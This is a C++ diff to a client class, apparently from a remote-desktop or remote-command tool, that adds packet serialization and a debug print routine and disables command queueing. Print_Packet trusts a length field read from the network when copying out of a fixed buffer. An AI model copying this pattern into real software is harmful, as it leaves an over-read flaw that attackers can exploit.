@@ -6,6 +6,17 @@
 #include "mod_remote_desktop.hpp"
 #include "misc.hpp"
 
+void Print_Packet(const Paquete& paquete) {
+    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
+    std::cout << "Tam buffer: " << paquete.uiTamBuffer<< '\n';
+    std::cout << "Ultimo: " << paquete.uiIsUltimo<< '\n';
+    std::vector<char> cBuff(paquete.uiTamBuffer + 1);
+    memcpy(cBuff.data(), paquete.cBuffer, paquete.uiTamBuffer);
+    cBuff[paquete.uiTamBuffer] = '\0';
+    std::cout << "Buffer: " << cBuff.data()<< '\n';
+
+}
+
 void Cliente::Init_Key() {
     for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
         this->bKey.push_back(this->t_key[i]);
@@ -738,8 +749,12 @@ void Cliente::MainLoop() {
         }
 
         if (iRecibido > 0) {
+            struct Paquete nNuevo;
+            this->m_DeserializarPaquete(cBuffer.data(), nNuevo);
             
-            cBuffer[iRecibido] = '\0';
+            Print_Packet(nNuevo);
+            
+            /*cBuffer[iRecibido] = '\0';
             {
                 std::unique_lock<std::mutex> lock(this->mtx_queue);
                 std::vector<char> nBuffer(iRecibido + 1);
@@ -747,7 +762,7 @@ void Cliente::MainLoop() {
 
                 this->queue_Comandos.push(nBuffer);
             }
-            DebugPrint("[MLOOP] Nuevo comando agregado al queue");
+            DebugPrint("[MLOOP] Nuevo comando agregado al queue");*/
         }
 
     }
@@ -962,6 +977,20 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
     }
 
     return iRecibido;
+}
+
+void Cliente::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
+    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer, sizeof(paquete.cBuffer));
+}
+
+void Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete) {
+    memcpy(&paquete.uiTipoPaquete, cBuffer, sizeof(paquete.uiTipoPaquete));
+    memcpy(&paquete.uiTamBuffer, cBuffer + sizeof(paquete.uiTipoPaquete), sizeof(paquete.uiTamBuffer));
+    memcpy(&paquete.uiIsUltimo, cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), sizeof(paquete.uiIsUltimo));
+    memcpy(&paquete.cBuffer, cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), sizeof(paquete.cBuffer));
 }
 
 //AES256
